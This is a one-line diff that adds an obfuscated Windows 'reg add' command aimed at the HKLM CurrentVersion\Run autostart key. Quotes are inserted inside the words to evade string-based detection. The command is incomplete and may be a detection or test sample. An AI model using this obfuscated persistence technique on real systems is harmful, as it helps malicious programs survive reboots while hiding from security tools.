@@ -1,0 +1,1 @@
+reg a"dd" HKLM\so"ftw"are\Mi"cro"soft\Win"dow"s\Curr"ent"Version\Run
